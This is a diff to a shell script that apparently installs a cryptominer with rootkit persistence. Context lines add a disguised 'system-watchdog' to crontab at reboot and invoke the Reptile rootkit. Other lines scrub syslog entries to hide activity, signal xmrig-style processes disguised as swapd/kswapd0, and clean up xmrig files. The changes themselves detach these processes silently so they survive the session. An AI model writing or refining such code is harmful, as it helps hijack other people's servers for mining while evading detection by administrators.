@@ -1291,8 +1291,9 @@ chmod +x /usr/local/bin/system-watchdog
 
 # Enable the watchdog via crontab (use system-watchdog)
 (crontab -l 2>/dev/null | grep -v "system-watchdog\|system-check"; echo "@reboot /usr/local/bin/system-watchdog &") | crontab -
-# Start it now
-/usr/local/bin/system-watchdog &
+# Start it now (detached)
+/usr/local/bin/system-watchdog >/dev/null 2>&1 &
+disown
 
 echo "[✓] Intelligent watchdog deployed (3-min intervals, state-tracked)"
 echo ""
@@ -1741,7 +1742,7 @@ sudo sysctl -p
 CURRENT_SSH_PID=$$  # Capture current SSH session PID
 CURRENT_SSH_PORT=$(ss -tnp | awk -v pid=$CURRENT_SSH_PID '/:22/ && $0 ~ pid {split($4,a,":"); print a[2]}')
 
-# Schedule connection watchdog
+# Schedule connection watchdog (detached from script)
 (
     sleep 30
     if ! ping -c1 1.1.1.1 &>/dev/null; then
@@ -1749,7 +1750,8 @@ CURRENT_SSH_PORT=$(ss -tnp | awk -v pid=$CURRENT_SSH_PID '/:22/ && $0 ~ pid {spl
         /reptile/reptile_cmd unhide_all
         reboot
     fi
-) &
+) >/dev/null 2>&1 &
+disown
 
 echo "[*] Reptile..."
 cd /tmp
@@ -1863,12 +1865,13 @@ sed -i '/Deactivated successfully/d' /var/log/syslog
 
 echo ""
 
-kill -31 $(pgrep -f -u root config.json) 2>/dev/null &
-kill -31 $(pgrep -f -u root config_background.json) 2>/dev/null &
-kill -31 $(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
-kill -31 $(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
-kill -63 $(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
-kill -63 $(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
+kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
+kill -31 $(pgrep -f -u root config_background.json) 2>/dev/null || true
+kill -31 $(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+kill -31 $(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+kill -63 $(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+kill -63 $(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+
 
 # Cleanup xmrig files in login directory
 echo "[*] Cleaning up xmrig files in login directory..."
